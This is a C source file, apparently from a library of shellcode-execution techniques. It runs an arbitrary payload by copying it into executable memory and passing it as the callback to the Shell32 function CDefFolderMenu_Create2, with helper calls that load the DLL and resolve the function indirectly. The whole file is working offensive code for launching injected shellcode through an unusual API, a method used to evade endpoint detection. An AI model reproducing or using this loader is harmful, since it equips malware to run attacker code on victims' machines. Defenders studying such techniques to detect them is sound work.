#include "Win32Helper.h"

DWORD UnusedSubroutineDisposeableThreadCDefFolderMenu_Create2(LPVOID Param)
{
	PSHELLCODE_EXECUTION_INFORMATION Sei = (PSHELLCODE_EXECUTION_INFORMATION)Param;
	CDEFFOLDERMENU_CREATE2 CDefFolderMenu_Create2 = NULL;
	LPVOID BinAddress = NULL;
	HMODULE hModule = NULL;
	BOOL bFlag = FALSE;
	PVOID ContextMenuRequired = NULL;

	hModule = TryLoadDllMultiMethodW((PWCHAR)L"Shell32.dll");
	if (!hModule)
		goto EXIT_ROUTINE;

	CDefFolderMenu_Create2 = (CDEFFOLDERMENU_CREATE2)GetProcAddressA((DWORD64)hModule, "CDefFolderMenu_Create2");
	if (!CDefFolderMenu_Create2)
		goto EXIT_ROUTINE;

	BinAddress = VirtualAlloc(NULL, Sei->dwLengthOfPayloadInBytes, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (BinAddress == NULL)
		goto EXIT_ROUTINE;

	CopyMemoryEx(BinAddress, Sei->Payload, Sei->dwLengthOfPayloadInBytes);

	if (!SUCCEEDED(CDefFolderMenu_Create2(NULL, NULL, 0, NULL, NULL, BinAddress, 0, NULL, &ContextMenuRequired)))
		goto EXIT_ROUTINE;

	bFlag = TRUE;

EXIT_ROUTINE:

	if (hModule)
		FreeLibrary(hModule);

	if (BinAddress)
		VirtualFree(BinAddress, 0, MEM_RELEASE);

	return (bFlag ? 0 : 0xffffffff);
}


BOOL ShellcodeExecViaCDefFolderMenu_Create2(_In_ PSHELLCODE_EXECUTION_INFORMATION Sei)
{
	return CreateThreadAndWaitForCompletion(UnusedSubroutineDisposeableThreadCDefFolderMenu_Create2, Sei, INFINITE);
}